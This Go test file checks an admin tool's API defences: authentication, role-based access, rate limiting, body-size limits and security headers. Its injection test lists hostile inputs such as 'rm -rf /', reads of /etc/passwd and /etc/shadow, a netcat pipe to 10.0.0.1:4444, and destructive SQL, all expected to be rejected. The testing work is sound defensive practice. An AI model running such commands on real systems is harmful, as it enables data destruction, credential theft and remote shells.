package api

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"

	"go-admin-tool/internal/audit"
	"go-admin-tool/internal/auth"
	"go-admin-tool/internal/core"
	"go-admin-tool/internal/database"
	"go-admin-tool/internal/jobs"
	"go-admin-tool/internal/mcp"
	"go-admin-tool/internal/plugins"
)

func setupSecurityAuditEnv(t *testing.T, requireAuth bool) (*APIEnv, http.Handler, map[string]string) {
	t.Helper()

	tmpDir := t.TempDir()
	secureDir := filepath.Join(tmpDir, "secure_files")
	if err := os.MkdirAll(secureDir, 0700); err != nil {
		t.Fatalf("failed to create secure dir: %v", err)
	}
	if err := os.WriteFile(filepath.Join(secureDir, "audit-report.txt"), []byte("confidential-audit-payload"), 0600); err != nil {
		t.Fatalf("failed to seed secure file: %v", err)
	}

	cfg := core.DefaultConfig()
	cfg.Server.TLS.Enabled = true
	cfg.Server.TLS.AutoGenerate = true
	cfg.Server.TLS.CertFile = filepath.Join(tmpDir, "server.crt")
	cfg.Server.TLS.KeyFile = filepath.Join(tmpDir, "server.key")
	cfg.FileServer.Enabled = true
	cfg.FileServer.SecureDir = secureDir
	cfg.Executor.Enabled = true
	cfg.Executor.MaxTimeoutSeconds = 30

	echoCmd := core.CommandDefinition{Name: "allowed-cmd", Command: "sh", Args: []string{"-c", "echo security-ok"}}
	restrictedCmd := core.CommandDefinition{Name: "restricted-cmd", Command: "sh", Args: []string{"-c", "echo restricted-ok"}}
	if runtime.GOOS == "windows" {
		echoCmd = core.CommandDefinition{Name: "allowed-cmd", Command: "cmd", Args: []string{"/C", "echo security-ok"}}
		restrictedCmd = core.CommandDefinition{Name: "restricted-cmd", Command: "cmd", Args: []string{"/C", "echo restricted-ok"}}
	}
	cfg.Executor.Commands = []core.CommandDefinition{echoCmd, restrictedCmd}

	cfg.Auth.Enabled = true
	cfg.Auth.RequireAuth = requireAuth
	cfg.Auth.BootstrapUsername = "admin"
	cfg.Auth.BootstrapPassword = "AdminSecurePassword!2026"

	logger, err := core.NewLogger(core.LoggingConfig{Level: "info"})
	if err != nil {
		t.Fatalf("failed to init logger: %v", err)
	}
	t.Cleanup(func() { _ = logger.Close() })

	db, err := database.NewDB(":memory:")
	if err != nil {
		t.Fatalf("failed to init db: %v", err)
	}
	t.Cleanup(func() { _ = db.Close() })
	if err := db.Init(); err != nil {
		t.Fatalf("failed to init db schema: %v", err)
	}

	cm, err := core.NewCertManager(cfg.Server.TLS, "localhost")
	if err != nil {
		t.Fatalf("failed to init cert manager: %v", err)
	}

	auditLogger, err := audit.NewAuditLogger(cfg.Audit, db, logger)
	if err != nil {
		t.Fatalf("failed to init audit logger: %v", err)
	}
	t.Cleanup(func() { _ = auditLogger.Close() })

	authMgr, err := auth.NewManager(cfg.Auth)
	if err != nil {
		t.Fatalf("failed to init auth manager: %v", err)
	}

	reg := plugins.NewEmptyRegistry()
	plugins.RegisterDefaultNativePlugins(reg, db, 100)
	if declOps, err := plugins.DefaultDeclarativeOpsPlugin(); err == nil {
		_ = reg.RegisterOrReplace(declOps)
	}

	mcpSrv, err := mcp.NewServer(cfg.MCP, cfg, db, cm, reg, auditLogger, logger, RecordActionCall)
	if err != nil {
		t.Fatalf("failed to init mcp server: %v", err)
	}
	t.Cleanup(func() { _ = mcpSrv.Close() })

	jobStore := jobs.NewMemoryJobStore()
	engineCfg := jobs.DefaultEngineConfig()
	engineCfg.WorkersCount = 2
	engineCfg.QueueCapacity = 10
	jobEngine, err := jobs.NewEngine(engineCfg, jobStore, auditLogger, func(ctx context.Context, job *jobs.Job, logWriter io.Writer) (any, error) {
		if logWriter != nil {
			_, _ = logWriter.Write([]byte("async-job-ok\n"))
		}
		return map[string]any{"status": "ok"}, nil
	})
	if err != nil {
		t.Fatalf("failed to create job engine: %v", err)
	}
	if err := jobEngine.Start(); err != nil {
		t.Fatalf("failed to start job engine: %v", err)
	}
	t.Cleanup(func() {
		shutdownCtx, cancel := context.WithTimeout(context.Background(), time.Second)
		_ = jobEngine.Shutdown(shutdownCtx)
		cancel()
	})

	env := &APIEnv{
		Config:         cfg,
		Logger:         logger,
		DB:             db,
		CertManager:    cm,
		AuditLogger:    auditLogger,
		AuthManager:    authMgr,
		PluginRegistry: reg,
		MCPServer:      mcpSrv,
		JobEngine:      jobEngine,
	}

	// Seed credentials across all 4 RBAC tiers + revoked/expired/disabled tokens
	_, _, adminToken, err := authMgr.AuthenticateUser("admin", "AdminSecurePassword!2026")
	if err != nil {
		t.Fatalf("failed to login admin: %v", err)
	}

	opUser, err := authMgr.CreateUser("sec_operator", "OperatorPass!123", "Security Operator", "op@sec.local", auth.RoleOperator)
	if err != nil {
		t.Fatalf("failed to create operator: %v", err)
	}
	_, opToken, err := authMgr.CreateToken(opUser.ID, "op-token", nil, time.Hour)
	if err != nil {
		t.Fatalf("failed to create operator token: %v", err)
	}

	viewerUser, err := authMgr.CreateUser("sec_viewer", "ViewerPass!123", "Security Viewer", "viewer@sec.local", auth.RoleViewer)
	if err != nil {
		t.Fatalf("failed to create viewer: %v", err)
	}
	_, viewerToken, err := authMgr.CreateToken(viewerUser.ID, "viewer-token", nil, time.Hour)
	if err != nil {
		t.Fatalf("failed to create viewer token: %v", err)
	}

	_, scopedSAKey, err := authMgr.CreateServiceAccount(
		"scoped-agent",
		"Scoped Monitoring Agent",
		"Strictly limited to allowed-cmd and sys-diagnostics",
		[]string{"commands:read", "commands:execute", "plugins:read", "plugins:execute", "mcp:access", auth.ScopeJobsSubmit, auth.ScopeJobsRead},
		[]string{"allowed-cmd", "plugin:sys-diagnostics:runtime_stats", "sys-diagnostics"},
		time.Hour,
	)
	if err != nil {
		t.Fatalf("failed to create scoped service account: %v", err)
	}

	revokedTokInfo, revokedToken, err := authMgr.CreateToken(opUser.ID, "revoked-token", nil, time.Hour)
	if err != nil {
		t.Fatalf("failed to create token to revoke: %v", err)
	}
	_ = authMgr.RevokeToken(revokedTokInfo.ID)

	disabledUser, err := authMgr.CreateUser("disabled_user", "DisabledPass!123", "Disabled Account", "dis@sec.local", auth.RoleOperator)
	if err != nil {
		t.Fatalf("failed to create disabled user: %v", err)
	}
	_, disabledToken, err := authMgr.CreateToken(disabledUser.ID, "disabled-user-token", nil, time.Hour)
	if err != nil {
		t.Fatalf("failed to create disabled user token: %v", err)
	}
	activeFalse := false
	_, _ = authMgr.UpdateUser(disabledUser.ID, &activeFalse, "")

	tokens := map[string]string{
		"admin":          adminToken,
		"operator":       opToken,
		"viewer":         viewerToken,
		"service":        scopedSAKey,
		"revoked":        revokedToken,
		"disabled_user":  disabledToken,
		"forged":         "gat_pat_00000000000000000000000000000000deadbeef",
	}

	return env, NewRouter(env), tokens
}

// TestAPISecurityAudit_UnauthorizedAccessAllEndpoints verifies that when RequireAuth=true,
// all protected API endpoints reject missing, forged, revoked, and disabled-account credentials
// with HTTP 401 Unauthorized, and fail closed even if AuthManager is nil or Auth.Enabled is false.
func TestAPISecurityAudit_UnauthorizedAccessAllEndpoints(t *testing.T) {
	env, router, tokens := setupSecurityAuditEnv(t, true)

	protectedEndpoints := []struct {
		name   string
		method string
		path   string
		body   string
	}{
		{"ListCommands", http.MethodGet, "/api/v1/commands", ""},
		{"ExecuteCommand", http.MethodPost, "/api/v1/execute", `{"name":"allowed-cmd"}`},
		{"ActivatePresets", http.MethodPost, "/api/v1/presets/activate", `{"families":["ubuntu"]}`},
		{"ListFiles", http.MethodGet, "/api/v1/files", ""},
		{"DownloadFile", http.MethodGet, "/api/v1/files/audit-report.txt", ""},
		{"TLSRenew", http.MethodPost, "/api/v1/tls/renew", ""},
		{"AuditLogs", http.MethodGet, "/api/v1/audit/logs", ""},
		{"AuditVerify", http.MethodGet, "/api/v1/audit/verify", ""},
		{"SystemLogs", http.MethodGet, "/api/v1/logs", ""},
		{"ActionHistory", http.MethodGet, "/api/v1/history", ""},
		{"AuthMe", http.MethodGet, "/api/v1/auth/me", ""},
		{"AuthUsers_List", http.MethodGet, "/api/v1/auth/users", ""},
		{"AuthUsers_Create", http.MethodPost, "/api/v1/auth/users", `{"username":"u","password":"password123"}`},
		{"AuthTokens_List", http.MethodGet, "/api/v1/auth/tokens", ""},
		{"AuthTokens_Create", http.MethodPost, "/api/v1/auth/tokens", `{"name":"t"}`},
		{"AuthServiceAccounts_List", http.MethodGet, "/api/v1/auth/service-accounts", ""},
		{"AuthServiceAccounts_Create", http.MethodPost, "/api/v1/auth/service-accounts", `{"name":"sa"}`},
		{"AuthServiceAccounts_Rotate", http.MethodPost, "/api/v1/auth/service-accounts/rotate", `{"id":"svc_1"}`},
		{"PluginsList", http.MethodGet, "/api/v1/plugins", ""},
		{"PluginExecute", http.MethodPost, "/api/v1/plugins/execute", `{"plugin_id":"sys-diagnostics","action":"runtime_stats"}`},
		{"PluginDeclarativeRegister", http.MethodPost, "/api/v1/plugins/declarative", `{}`},
		{"DBTables", http.MethodGet, "/api/v1/db/tables", ""},
		{"DBQuery", http.MethodPost, "/api/v1/db/query", `{"sql":"SELECT 1"}`},
		{"MCP_GetMetadata", http.MethodGet, "/api/v1/mcp", ""},
		{"MCP_PostRPC", http.MethodPost, "/api/v1/mcp", `{"jsonrpc":"2.0","id":1,"method":"tools/list"}`},
		{"MCP_Tools", http.MethodGet, "/api/v1/mcp/tools", ""},
		{"MCP_TracesList", http.MethodGet, "/api/v1/mcp/traces", ""},
		{"MCP_TracesDelete", http.MethodDelete, "/api/v1/mcp/traces", ""},
		{"MCP_TraceByID", http.MethodGet, "/api/v1/mcp/traces/mcp_tr_1", ""},
		{"Jobs_Submit", http.MethodPost, "/api/v1/jobs", `{"type":"command","action":"allowed-cmd"}`},
		{"Jobs_List", http.MethodGet, "/api/v1/jobs", ""},
		{"Jobs_QueueStats", http.MethodGet, "/api/v1/jobs/queue", ""},
		{"Jobs_GetByID", http.MethodGet, "/api/v1/jobs/job_123", ""},
		{"Jobs_GetLogs", http.MethodGet, "/api/v1/jobs/job_123/logs", ""},
		{"Jobs_Cancel", http.MethodPost, "/api/v1/jobs/job_123/cancel", ""},
	}

	invalidCredCases := []struct {
		label string
		token string
	}{
		{"NoToken", ""},
		{"ForgedToken", tokens["forged"]},
		{"RevokedToken", tokens["revoked"]},
		{"DisabledUserToken", tokens["disabled_user"]},
	}

	for _, ep := range protectedEndpoints {
		for _, cred := range invalidCredCases {
			t.Run(ep.name+"_"+cred.label, func(t *testing.T) {
				var bodyReader io.Reader
				if ep.body != "" {
					bodyReader = strings.NewReader(ep.body)
				}
				req := httptest.NewRequest(ep.method, ep.path, bodyReader)
				if cred.token != "" {
					req.Header.Set("Authorization", "Bearer "+cred.token)
				}
				rec := httptest.NewRecorder()
				router.ServeHTTP(rec, req)

				if rec.Code != http.StatusUnauthorized {
					t.Errorf("expected 401 Unauthorized on %s %s with %s, got %d (body: %s)",
						ep.method, ep.path, cred.label, rec.Code, rec.Body.String())
				}
			})
		}
	}

	// Verify Fail-Closed invariant: when RequireAuth=true, even if Auth.Enabled=false or AuthManager=nil,
	// protected endpoints must NEVER fall back to anonymous access.
	t.Run("FailClosed_WhenRequireAuthTrueAndAuthDisabledOrNilManager", func(t *testing.T) {
		cfgCopy := *env.Config
		cfgCopy.Auth.RequireAuth = true
		cfgCopy.Auth.Enabled = false

		failClosedEnv := &APIEnv{
			Config:         &cfgCopy,
			Logger:         env.Logger,
			DB:             env.DB,
			CertManager:    env.CertManager,
			AuditLogger:    env.AuditLogger,
			AuthManager:    nil,
			PluginRegistry: env.PluginRegistry,
			MCPServer:      env.MCPServer,
			JobEngine:      env.JobEngine,
		}
		fcRouter := NewRouter(failClosedEnv)

		for _, ep := range []struct {
			method string
			path   string
			body   string
		}{
			{http.MethodPost, "/api/v1/execute", `{"name":"allowed-cmd"}`},
			{http.MethodGet, "/api/v1/plugins", ""},
			{http.MethodPost, "/api/v1/plugins/execute", `{"plugin_id":"sys-diagnostics","action":"runtime_stats"}`},
			{http.MethodGet, "/api/v1/db/tables", ""},
			{http.MethodPost, "/api/v1/db/query", `{"sql":"SELECT 1"}`},
			{http.MethodGet, "/api/v1/mcp", ""},
			{http.MethodGet, "/api/v1/mcp/tools", ""},
			{http.MethodGet, "/api/v1/mcp/traces", ""},
			{http.MethodGet, "/api/v1/auth/me", ""},
		} {
			req := httptest.NewRequest(ep.method, ep.path, strings.NewReader(ep.body))
			req.Header.Set("Authorization", "Bearer forged-when-nil-manager")
			rec := httptest.NewRecorder()
			fcRouter.ServeHTTP(rec, req)
			if rec.Code != http.StatusUnauthorized {
				t.Errorf("fail-open detected on %s %s when RequireAuth=true and AuthManager=nil: expected 401, got %d",
					ep.method, ep.path, rec.Code)
			}
		}
	})
}

// TestAPISecurityAudit_PrivilegeEscalationAndUnauthorizedAdditions verifies that non-admin
// principals (anonymous, viewer, operator, service_account) cannot add users, elevate roles,
// issue elevated PATs, add/rotate service accounts, activate OS presets, register declarative
// plugins, renew TLS certificates, clear MCP traces, or bypass action allowlists.
func TestAPISecurityAudit_PrivilegeEscalationAndUnauthorizedAdditions(t *testing.T) {
	// Use RequireAuth=false so we can also test anonymous principal alongside viewer, operator, and service_account
	env, router, tokens := setupSecurityAuditEnv(t, false)

	nonAdminPrincipals := []struct {
		name  string
		token string
	}{
		{"Anonymous", ""},
		{"Viewer", tokens["viewer"]},
		{"Operator", tokens["operator"]},
		{"ServiceAccount", tokens["service"]},
	}

	adminOnlyMutations := []struct {
		name   string
		method string
		path   string
		body   string
	}{
		{"AddUser", http.MethodPost, "/api/v1/auth/users", `{"username":"rogue_admin","password":"Password123!","role":"admin"}`},
		{"ElevateUserRole", http.MethodPatch, "/api/v1/auth/users", `{"id":"usr_1","role":"admin"}`},
		{"DeleteUser", http.MethodDelete, "/api/v1/auth/users?id=usr_1", ""},
		{"MintAdminToken", http.MethodPost, "/api/v1/auth/tokens", `{"user_id":"admin","name":"escalated","scopes":["*"]}`},
		{"AddServiceAccount", http.MethodPost, "/api/v1/auth/service-accounts", `{"name":"rogue-sa","allowed_actions":["*"]}`},
		{"RotateServiceAccount", http.MethodPost, "/api/v1/auth/service-accounts/rotate", `{"id":"svc_1"}`},
		{"DeleteServiceAccount", http.MethodDelete, "/api/v1/auth/service-accounts?id=svc_1", ""},
		{"ActivateOSPresets", http.MethodPost, "/api/v1/presets/activate", `{"families":["ubuntu","redhat"]}`},
		{"AddDeclarativePlugin", http.MethodPost, "/api/v1/plugins/declarative", `{"id":"rogue-plugin","name":"Rogue","version":"1.0.0","actions":[{"name":"pwn","command":"echo","args":["hi"]}]}`},
		{"RotateTLSCertificate", http.MethodPost, "/api/v1/tls/renew", ""},
		{"ClearMCPTraces", http.MethodDelete, "/api/v1/mcp/traces", ""},
	}

	for _, actor := range nonAdminPrincipals {
		for _, mut := range adminOnlyMutations {
			t.Run(actor.name+"_Cannot_"+mut.name, func(t *testing.T) {
				req := httptest.NewRequest(mut.method, mut.path, strings.NewReader(mut.body))
				if actor.token != "" {
					req.Header.Set("Authorization", "Bearer "+actor.token)
				}
				rec := httptest.NewRecorder()
				router.ServeHTTP(rec, req)

				if rec.Code != http.StatusForbidden {
					t.Errorf("privilege escalation / unauthorized addition allowed for %s on %s %s: expected 403 Forbidden, got %d (body: %s)",
						actor.name, mut.method, mut.path, rec.Code, rec.Body.String())
				}
			})
		}
	}

	// Verify Viewer role (read-only) cannot execute commands, plugins, DB queries, submit/cancel jobs, or read MCP traces without mcp:access scope
	viewerForbiddenActions := []struct {
		name   string
		method string
		path   string
		body   string
	}{
		{"Viewer_ExecuteCommand", http.MethodPost, "/api/v1/execute", `{"name":"allowed-cmd"}`},
		{"Viewer_ExecutePlugin", http.MethodPost, "/api/v1/plugins/execute", `{"plugin_id":"sys-diagnostics","action":"runtime_stats"}`},
		{"Viewer_ExecuteDBQuery", http.MethodPost, "/api/v1/db/query", `{"sql":"SELECT * FROM action_history"}`},
		{"Viewer_MCPAccess", http.MethodGet, "/api/v1/mcp", ""},
		{"Viewer_MCPTools", http.MethodGet, "/api/v1/mcp/tools", ""},
		{"Viewer_MCPTracesList", http.MethodGet, "/api/v1/mcp/traces", ""},
		{"Viewer_MCPTraceByID", http.MethodGet, "/api/v1/mcp/traces/mcp_tr_1", ""},
		{"Viewer_SubmitAsyncJob", http.MethodPost, "/api/v1/jobs", `{"type":"command","action":"allowed-cmd"}`},
	}

	for _, tc := range viewerForbiddenActions {
		t.Run(tc.name, func(t *testing.T) {
			req := httptest.NewRequest(tc.method, tc.path, strings.NewReader(tc.body))
			req.Header.Set("Authorization", "Bearer "+tokens["viewer"])
			rec := httptest.NewRecorder()
			router.ServeHTTP(rec, req)
			if rec.Code != http.StatusForbidden {
				t.Errorf("expected 403 Forbidden for %s (%s %s), got %d: %s",
					tc.name, tc.method, tc.path, rec.Code, rec.Body.String())
			}
		})
	}

	// Verify Scoped Service Account allowlist cannot be bypassed via REST, Async Jobs, or MCP JSON-RPC
	t.Run("ScopedServiceAccount_AllowlistEnforcementAcrossRESTJobsAndMCP", func(t *testing.T) {
		// 1. Synchronous command execution of restricted-cmd -> 403
		reqCmd := httptest.NewRequest(http.MethodPost, "/api/v1/execute", strings.NewReader(`{"name":"restricted-cmd"}`))
		reqCmd.Header.Set("X-Service-Key", tokens["service"])
		recCmd := httptest.NewRecorder()
		router.ServeHTTP(recCmd, reqCmd)
		if recCmd.Code != http.StatusForbidden {
			t.Errorf("expected 403 when scoped SA executes restricted-cmd via REST, got %d", recCmd.Code)
		}

		// 2. Asynchronous job submission of restricted-cmd -> 403
		reqJob := httptest.NewRequest(http.MethodPost, "/api/v1/jobs", strings.NewReader(`{"type":"command","action":"restricted-cmd"}`))
		reqJob.Header.Set("X-Service-Key", tokens["service"])
		recJob := httptest.NewRecorder()
		router.ServeHTTP(recJob, reqJob)
		if recJob.Code != http.StatusForbidden {
			t.Errorf("expected 403 when scoped SA submits restricted-cmd via /api/v1/jobs, got %d", recJob.Code)
		}

		// 3. MCP JSON-RPC tools/call on restricted-cmd -> isError: true
		mcpBody := `{"jsonrpc":"2.0","id":99,"method":"tools/call","params":{"name":"execute_command","arguments":{"name":"restricted-cmd"}}}`
		reqMCP := httptest.NewRequest(http.MethodPost, "/api/v1/mcp", strings.NewReader(mcpBody))
		reqMCP.Header.Set("X-Service-Key", tokens["service"])
		recMCP := httptest.NewRecorder()
		router.ServeHTTP(recMCP, reqMCP)
		if !strings.Contains(recMCP.Body.String(), `"isError":true`) {
			t.Errorf("expected MCP tools/call on restricted-cmd to be blocked with isError=true, got: %s", recMCP.Body.String())
		}
	})

	// Verify SHA-256 tamper-evident audit chain integrity after recording all security denials
	verifyRes := env.AuditLogger.VerifyChain()
	if !verifyRes.Valid || verifyRes.TotalEvents == 0 {
		t.Fatalf("expected valid SHA-256 audit hash chain after security denial tests, got valid=%v total=%d",
			verifyRes.Valid, verifyRes.TotalEvents)
	}
}

// TestAPISecurityAudit_InjectionAndConfinementPrevention validates that arbitrary commands,
// shell metacharacters in declarative plugins, path traversal sequences, and mutating SQL
// statements are systematically blocked across all API entry points.
func TestAPISecurityAudit_InjectionAndConfinementPrevention(t *testing.T) {
	_, router, tokens := setupSecurityAuditEnv(t, true)
	adminAuth := "Bearer " + tokens["admin"]

	// 1. Unlisted command execution attempt must be rejected with 404 Not Found
	for _, cmdPayload := range []string{
		`{"name":"rm -rf /"}`,
		`{"name":"allowed-cmd; cat /etc/passwd"}`,
		`{"name":"$(whoami)"}`,
	} {
		req := httptest.NewRequest(http.MethodPost, "/api/v1/execute", strings.NewReader(cmdPayload))
		req.Header.Set("Authorization", adminAuth)
		rec := httptest.NewRecorder()
		router.ServeHTTP(rec, req)
		if rec.Code != http.StatusNotFound {
			t.Errorf("expected 404 Not Found for unlisted command %s, got %d", cmdPayload, rec.Code)
		}
	}

	// 2. Declarative plugin shell metacharacter & path traversal injection attempts -> 400 Bad Request
	for _, badParam := range []string{
		"; cat /etc/passwd",
		"$(id)",
		"`whoami`",
		"| nc 10.0.0.1 4444",
		"../../../../etc/shadow",
		"..\\..\\windows\\win.ini",
	} {
		payload, _ := json.Marshal(map[string]any{
			"plugin_id": "ops-quick-tools",
			"action":    "probe-target",
			"params":    map[string]any{"target": badParam},
		})
		req := httptest.NewRequest(http.MethodPost, "/api/v1/plugins/execute", bytes.NewReader(payload))
		req.Header.Set("Authorization", adminAuth)
		rec := httptest.NewRecorder()
		router.ServeHTTP(rec, req)
		if rec.Code != http.StatusBadRequest {
			t.Errorf("expected 400 Bad Request for declarative plugin injection %q, got %d: %s",
				badParam, rec.Code, rec.Body.String())
		}
	}

	// 3. File server path traversal attempts -> 400 Bad Request
	for _, traversalPath := range []string{
		"/api/v1/files/..%2f..%2fetc%2fpasswd",
		"/api/v1/files/..%5c..%5cwindows%5cwin.ini",
		"/api/v1/files/subdir/secret.txt",
	} {
		req := httptest.NewRequest(http.MethodGet, traversalPath, nil)
		req.Header.Set("Authorization", adminAuth)
		rec := httptest.NewRecorder()
		router.ServeHTTP(rec, req)
		if rec.Code != http.StatusBadRequest && rec.Code != http.StatusForbidden && rec.Code != http.StatusNotFound {
			t.Errorf("expected 400/403/404 for file traversal %q, got %d", traversalPath, rec.Code)
		}
	}

	// 4. Read-Only SQL injection & mutation attempts on /api/v1/db/query -> 403 Forbidden
	forbiddenSQLQueries := []string{
		"DROP TABLE action_history",
		"DELETE FROM action_history WHERE 1=1",
		"INSERT INTO action_history (command_name, status, output) VALUES ('pwn', 'ok', 'x')",
		"UPDATE action_history SET status='pwned'",
		"ALTER TABLE action_history ADD COLUMN backdoor TEXT",
		"ATTACH DATABASE ':memory:' AS aux",
		"PRAGMA writable_schema = ON",
		"SELECT * FROM action_history; DROP TABLE action_history",
		"SELECT * FROM action_history -- comment injection",
	}

	for _, sqlQuery := range forbiddenSQLQueries {
		payload, _ := json.Marshal(map[string]any{
			"action": "query_readonly",
			"sql":    sqlQuery,
		})
		req := httptest.NewRequest(http.MethodPost, "/api/v1/db/query", bytes.NewReader(payload))
		req.Header.Set("Authorization", adminAuth)
		rec := httptest.NewRecorder()
		router.ServeHTTP(rec, req)
		if rec.Code != http.StatusForbidden {
			t.Errorf("expected 403 Forbidden for forbidden SQL %q, got %d: %s",
				sqlQuery, rec.Code, rec.Body.String())
		}
	}
}

// TestAPISecurityAudit_DDoSAndRateLimitingResilience verifies multi-layered DDoS protections:
// 1. Per-IP Token-Bucket Rate Limiting (HTTP 429 Too Many Requests + Retry-After + spoofed-IP cap)
// 2. HTTP Request Body Size Bounding (HTTP 413 Request Entity Too Large on >1 MiB payloads)
// 3. Defensive HTTP Security Headers (X-Content-Type-Options, X-Frame-Options, Referrer-Policy, HSTS)
// 4. Per-Call Timeout Ceiling Enforcement & Prometheus Cardinality Bounding
func TestAPISecurityAudit_DDoSAndRateLimitingResilience(t *testing.T) {
	env, router, tokens := setupSecurityAuditEnv(t, true)
	adminAuth := "Bearer " + tokens["admin"]

	// 1. Defensive HTTP Security Headers
	t.Run("DefensiveSecurityHeadersAndHSTS", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "https://localhost:8080/api/v1/commands", nil)
		req.Header.Set("Authorization", adminAuth)
		rec := httptest.NewRecorder()
		router.ServeHTTP(rec, req)

		if rec.Code != http.StatusOK {
			t.Fatalf("expected 200 OK, got %d", rec.Code)
		}
		expectedHeaders := map[string]string{
			"X-Content-Type-Options":            "nosniff",
			"X-Frame-Options":                   "DENY",
			"Referrer-Policy":                   "no-referrer",
			"X-Permitted-Cross-Domain-Policies": "none",
			"Strict-Transport-Security":         "max-age=31536000; includeSubDomains",
		}
		for hdr, want := range expectedHeaders {
			if got := rec.Header().Get(hdr); got != want {
				t.Errorf("expected security header %s=%q, got %q", hdr, want, got)
			}
		}
	})

	// 2. Oversized HTTP Request Body DDoS Protection (HTTP 413 Request Entity Too Large)
	t.Run("OversizedRequestBodyRejectedWith413", func(t *testing.T) {
		oversizedPayload := `{"name":"` + strings.Repeat("A", MaxRequestBodyBytes+1024) + `"}`
		for _, target := range []string{
			"/api/v1/execute",
			"/api/v1/auth/login",
			"/api/v1/plugins/execute",
			"/api/v1/mcp",
			"/api/v1/jobs",
		} {
			// 2a. With known Content-Length
			req := httptest.NewRequest(http.MethodPost, target, strings.NewReader(oversizedPayload))
			req.Header.Set("Authorization", adminAuth)
			rec := httptest.NewRecorder()
			router.ServeHTTP(rec, req)
			if rec.Code != http.StatusRequestEntityTooLarge {
				t.Errorf("expected 413 Request Entity Too Large on %s with Content-Length > 1 MiB, got %d", target, rec.Code)
			}

			// 2b. With unknown/chunked Content-Length (-1) via io.NopCloser
			chunkedReq := httptest.NewRequest(http.MethodPost, target, io.NopCloser(strings.NewReader(oversizedPayload)))
			chunkedReq.ContentLength = -1
			chunkedReq.Header.Set("Authorization", adminAuth)
			chunkedRec := httptest.NewRecorder()
			router.ServeHTTP(chunkedRec, chunkedReq)
			if chunkedRec.Code != http.StatusRequestEntityTooLarge {
				t.Errorf("expected 413 Request Entity Too Large on %s with chunked body > 1 MiB, got %d", target, chunkedRec.Code)
			}
		}
	})

	// 3. Per-IP Token-Bucket Rate Limiting against Volumetric DDoS & Brute-Force
	t.Run("PerIPTokenBucketRateLimitingAndSpoofedIPEviction", func(t *testing.T) {
		cfgCopy := *env.Config
		cfgCopy.Server.RateLimit = core.RateLimitConfig{
			Enabled:           true,
			RequestsPerSecond: 2,
			Burst:             5,
		}
		rlEnv := &APIEnv{
			Config:      &cfgCopy,
			AuthManager: env.AuthManager,
			AuditLogger: env.AuditLogger,
		}
		rlRouter := NewRouter(rlEnv)

		// First 5 requests from 203.0.113.10 within burst succeed (200 OK)
		for i := 0; i < 5; i++ {
			req := httptest.NewRequest(http.MethodGet, "/api/v1/commands", nil)
			req.RemoteAddr = "203.0.113.10:54321"
			req.Header.Set("Authorization", adminAuth)
			rec := httptest.NewRecorder()
			rlRouter.ServeHTTP(rec, req)
			if rec.Code != http.StatusOK {
				t.Fatalf("expected request %d within burst to return 200 OK, got %d", i+1, rec.Code)
			}
		}

		// 6th immediate request from 203.0.113.10 exceeds burst -> 429 Too Many Requests
		reqThrottled := httptest.NewRequest(http.MethodGet, "/api/v1/commands", nil)
		reqThrottled.RemoteAddr = "203.0.113.10:54321"
		reqThrottled.Header.Set("Authorization", adminAuth)
		recThrottled := httptest.NewRecorder()
		rlRouter.ServeHTTP(recThrottled, reqThrottled)
		if recThrottled.Code != http.StatusTooManyRequests {
			t.Fatalf("expected 429 Too Many Requests when rate limit burst is exceeded, got %d: %s",
				recThrottled.Code, recThrottled.Body.String())
		}
		if recThrottled.Header().Get("Retry-After") == "" {
			t.Errorf("expected Retry-After header on 429 response")
		}
		if recThrottled.Header().Get("X-RateLimit-Limit") != "5" {
			t.Errorf("expected X-RateLimit-Limit=5 header, got %q", recThrottled.Header().Get("X-RateLimit-Limit"))
		}

		// Legitimate traffic from a different IP (198.51.100.77) is unaffected (200 OK)
		reqOtherIP := httptest.NewRequest(http.MethodGet, "/api/v1/commands", nil)
		reqOtherIP.RemoteAddr = "198.51.100.77:12345"
		reqOtherIP.Header.Set("Authorization", adminAuth)
		recOtherIP := httptest.NewRecorder()
		rlRouter.ServeHTTP(recOtherIP, reqOtherIP)
		if recOtherIP.Code != http.StatusOK {
			t.Errorf("expected 200 OK for independent client IP during single-IP flood, got %d", recOtherIP.Code)
		}

		// Verify IPRateLimiter spoofed-IP table eviction bounds memory at MaxTrackedRateLimitIPs
		limiter := NewIPRateLimiter(10, 20)
		for i := 0; i < MaxTrackedRateLimitIPs+250; i++ {
			ip := fmt.Sprintf("10.%d.%d.%d", (i>>16)&0xff, (i>>8)&0xff, i&0xff)
			if !limiter.Allow(ip) {
				t.Fatalf("expected initial request for spoofed IP %s to be allowed", ip)
			}
		}
		if tracked := limiter.TrackedIPCount(); tracked > MaxTrackedRateLimitIPs {
			t.Errorf("expected TrackedIPCount <= %d after spoofed-IP flood, got %d", MaxTrackedRateLimitIPs, tracked)
		}
	})

	// 4. Timeout Ceiling & Prometheus Cardinality Bounding Under Fuzzing Flood
	t.Run("TimeoutCeilingAndMetricCardinalityBounding", func(t *testing.T) {
		// Timeout override exceeding MaxTimeoutSeconds (30s) -> 400 Bad Request
		reqExceedTimeout := httptest.NewRequest(http.MethodPost, "/api/v1/execute",
			strings.NewReader(`{"name":"allowed-cmd","timeout":"120s"}`))
		reqExceedTimeout.Header.Set("Authorization", adminAuth)
		recExceedTimeout := httptest.NewRecorder()
		router.ServeHTTP(recExceedTimeout, reqExceedTimeout)
		if recExceedTimeout.Code != http.StatusBadRequest {
			t.Errorf("expected 400 Bad Request when timeout exceeds max_timeout_seconds, got %d", recExceedTimeout.Code)
		}

		// Fuzz 100 random paths and dynamic action labels; verify cardinality stays bounded
		ResetHTTPMetrics()
		ResetActionMetrics()
		for i := 0; i < 100; i++ {
			randomPath := fmt.Sprintf("/api/v1/random-ddos-probe-%d/%d", i, i*7)
			req := httptest.NewRequest(http.MethodGet, randomPath, nil)
			rec := httptest.NewRecorder()
			router.ServeHTTP(rec, req)
			recordActionCall(fmt.Sprintf("unconfigured-fuzz-action-%d", i), "error", false, 0)
		}

		actionLabelsMu.Lock()
		dynCount := len(dynamicActions)
		actionLabelsMu.Unlock()
		if dynCount > MaxDynamicActionLabels {
			t.Errorf("dynamic action label cardinality exceeded MaxDynamicActionLabels (%d): got %d",
				MaxDynamicActionLabels, dynCount)
		}
	})
}
